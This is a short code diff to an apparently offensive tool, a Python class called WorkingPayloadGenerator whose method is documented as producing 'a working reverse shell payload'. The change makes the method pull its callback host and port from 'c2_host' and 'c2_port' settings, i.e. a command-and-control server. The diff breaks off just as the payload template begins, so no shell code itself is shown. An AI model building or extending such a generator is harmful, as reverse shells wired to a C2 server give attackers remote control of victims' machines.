@@ -24,10 +24,13 @@ class WorkingPayloadGenerator:
             "class {name}: pass"
         ]
     
-    def generate_payload(self, host: str, port: int, platform: str = 'all') -> str:
+    def generate_payload(self, host: str = None, port: int = None, platform: str = 'all') -> str:
         """
         Generate a working reverse shell payload
         """
+        from Core.config_loader import config
+        host = host or config.c2_host
+        port = port or config.c2_port
         
         # Base payload - simple, working reverse shell
         base_payload = f'''
